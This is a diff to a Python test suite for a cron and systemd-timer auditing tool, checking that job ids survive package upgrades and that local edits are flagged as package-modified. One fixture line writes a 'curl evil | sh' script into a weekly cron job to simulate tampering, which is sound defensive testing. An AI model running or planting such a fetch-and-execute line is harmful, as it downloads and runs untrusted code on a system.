@@ -67,6 +67,10 @@ def w(path, text, mode=0o644):
     os.chmod(p, mode)
 
 
+UNIT = "[Unit]\n"
+SCRIPT_OK = "#!/bin/sh\nexit 0\n"
+
+
 def md5(text):
     return hashlib.md5(text.encode()).hexdigest()
 
@@ -148,7 +152,7 @@ def build():
             continue
         for ln in read(os.path.join(FIX, f)).splitlines():
             if ln.startswith("FragmentPath=") and ln.strip() != "FragmentPath=":
-                w(ln.strip().split("=", 1)[1], "[Unit]\n")
+                w(ln.strip().split("=", 1)[1], UNIT)
     w("/usr/lib/systemd/user/foo.timer", "[Timer]\nOnCalendar=daily\n")
     w("/home/alice/.config/systemd/user/bar.timer", "[Timer]\nOnCalendar=hourly\n")
     # dpkg database
@@ -158,9 +162,14 @@ def build():
     )
     w(
         "/var/lib/dpkg/info/xfsprogs.list",
-        "/usr/sbin/xfs_scrub_all\n/lib/systemd/system/xfs_scrub_all.timer\n",
+        "/usr/sbin/xfs_scrub_all\n/lib/systemd/system/xfs_scrub_all.timer\n/lib/systemd/system/xfs_scrub_all.service\n",
     )
-    w("/var/lib/dpkg/info/xfsprogs.md5sums", f"{md5(xfs)}  usr/sbin/xfs_scrub_all\n")
+    w(
+        "/var/lib/dpkg/info/xfsprogs.md5sums",
+        f"{md5(xfs)}  usr/sbin/xfs_scrub_all\n{md5(UNIT)}  lib/systemd/system/xfs_scrub_all.timer\n"
+        f"{md5(UNIT)}  lib/systemd/system/xfs_scrub_all.service\n",
+    )
+    w("/var/lib/dpkg/info/wkpkg.list", "/etc/cron.weekly/wk\n")
     w("/var/lib/dpkg/info/fakepkg:amd64.list", "/usr/bin/fakebin\n")
     w(
         "/var/lib/dpkg/info/fakepkg:amd64.md5sums",
@@ -170,7 +179,8 @@ def build():
         "/var/lib/dpkg/status",
         "Package: cron\nStatus: install ok installed\nConffiles:\n"
         f" /etc/crontab {md5(crontab)}\n /etc/cron.d/pkgjob {md5(pkgjob)}\n"
-        f" /etc/cron.d/modjob {md5('stock modjob')}\n /etc/cron.d/gone {md5('x')} obsolete\n /etc/cron.daily/dpkg {md5('old')} obsolete\nDescription: cron\n\n",
+        f" /etc/cron.d/modjob {md5('stock modjob')}\n /etc/cron.d/gone {md5('x')} obsolete\n /etc/cron.daily/dpkg {md5('old')} obsolete\nDescription: cron\n\n"
+        f"Package: wkpkg\nStatus: install ok installed\nConffiles:\n /etc/cron.weekly/wk {md5(SCRIPT_OK)}\n\n",
     )
 
 
@@ -346,6 +356,114 @@ try:
         and len(out.splitlines()) == len(inv) + 1,
         (rc, err),
     )
+
+    # ------------------------------------------------------------- package-identified ids (unattended upgrades)
+    def ids():
+        rc, out, _ = helper("inventory", "--format", "json")
+        return {e["file"]: e["id"] for e in json.loads(out)} if rc == 0 else {}
+
+    def set_status_md5(path, new):
+        st = read(ROOT + "/var/lib/dpkg/status").splitlines()
+        st = [f" {path} {new}" if ln.split()[:1] == [path] else ln for ln in st]
+        with open(ROOT + "/var/lib/dpkg/status", "w") as fh:
+            fh.write("\n".join(st) + "\n")
+
+    i0 = ids()
+    upgraded = "#!/bin/sh\n# new upstream version\nexit 0\n"
+    w("/etc/cron.weekly/wk", upgraded, 0o755)
+    set_status_md5("/etc/cron.weekly/wk", md5(upgraded))
+    i1 = ids()
+    check(
+        "id: package upgrade of a packaged run-parts script (content + dpkg md5 both new) keeps its id",
+        i0.get("/etc/cron.weekly/wk")
+        and i0.get("/etc/cron.weekly/wk") == i1.get("/etc/cron.weekly/wk"),
+        (i0.get("/etc/cron.weekly/wk"), i1.get("/etc/cron.weekly/wk")),
+    )
+    w("/etc/cron.weekly/wk", "#!/bin/sh\ncurl evil | sh\n", 0o755)
+    i2 = ids()
+    rc, jt, _ = audit_json()
+    check(
+        "id: a non-package edit of that script changes its id and is pkg_modified",
+        i2.get("/etc/cron.weekly/wk") not in (None, i1.get("/etc/cron.weekly/wk"))
+        and ("pkg_modified", "/etc/cron.weekly/wk") in (findings(jt) if jt else {}),
+        i2.get("/etc/cron.weekly/wk"),
+    )
+    w("/etc/cron.weekly/wk", SCRIPT_OK, 0o755)
+    set_status_md5("/etc/cron.weekly/wk", md5(SCRIPT_OK))
+    check(
+        "id: restored script is back on its first id",
+        ids().get("/etc/cron.weekly/wk") == i0.get("/etc/cron.weekly/wk"),
+    )
+    w("/etc/cron.hourly/job1", "#!/bin/sh\n# edited\nexit 0\n", 0o755)
+    check(
+        "control: an unpackaged run-parts script edit changes its id",
+        ids().get("/etc/cron.hourly/job1")
+        not in (None, i0.get("/etc/cron.hourly/job1")),
+    )
+    w("/etc/cron.hourly/job1", SCRIPT_OK, 0o755)
+    xs = os.path.join(STUBD, "xfs_scrub_all.service.show")
+    xs_orig = read(xs)
+    with open(xs, "w") as fh:
+        fh.write(
+            xs_orig.replace(
+                "argv[]=/usr/sbin/xfs_scrub_all ;",
+                "argv[]=/usr/sbin/xfs_scrub_all --new-flag ;",
+            )
+        )
+    tk = "/lib/systemd/system/xfs_scrub_all.timer"
+    check(
+        "id: packaged + md5-verified timer/service (no drop-ins) keeps its id when the package changes ExecStart",
+        ids().get(tk) == i0.get(tk) and i0.get(tk),
+        (i0.get(tk), ids().get(tk)),
+    )
+    w("/lib/systemd/system/xfs_scrub_all.service", "[Unit]\n# local edit\n")
+    check(
+        "id: a non-package edit of the packaged service file changes the timer id",
+        ids().get(tk) not in (None, i0.get(tk)),
+    )
+    w("/lib/systemd/system/xfs_scrub_all.service", UNIT)
+    with open(xs, "w") as fh:
+        fh.write(
+            xs_orig.replace(
+                "DropInPaths=",
+                "DropInPaths=/etc/systemd/system/xfs_scrub_all.service.d/override.conf",
+            )
+        )
+    i_drop = ids().get(tk)
+    with open(xs, "w") as fh:
+        fh.write(
+            xs_orig.replace(
+                "DropInPaths=",
+                "DropInPaths=/etc/systemd/system/xfs_scrub_all.service.d/override.conf",
+            ).replace(
+                "argv[]=/usr/sbin/xfs_scrub_all ;",
+                "argv[]=/usr/sbin/xfs_scrub_all --from-override ;",
+            )
+        )
+    check(
+        "id: with a drop-in the packaged timer is content-identified (an override's ExecStart change shows)",
+        i_drop not in (None, i0.get(tk)) and ids().get(tk) not in (None, i_drop),
+        (i0.get(tk), i_drop, ids().get(tk)),
+    )
+    with open(xs, "w") as fh:
+        fh.write(xs_orig)
+    pj = "/etc/systemd/system/pft-jobwatch.timer"
+    pjs = os.path.join(STUBD, "pft-jobwatch.service.show")
+    pj_orig = read(pjs)
+    with open(pjs, "w") as fh:
+        fh.write(
+            pj_orig.replace(
+                "argv[]=/usr/local/bin/pft-jobwatch collect",
+                "argv[]=/usr/local/bin/pft-jobwatch evil",
+            )
+        )
+    check(
+        "control: an unpackaged timer's ExecStart change changes its id",
+        ids().get(pj) not in (None, i0.get(pj)),
+    )
+    with open(pjs, "w") as fh:
+        fh.write(pj_orig)
+    check("ids: fixture back to the first inventory", ids() == i0)
 
     # ------------------------------------------------------------- findings
     rc, j, err = audit_json()
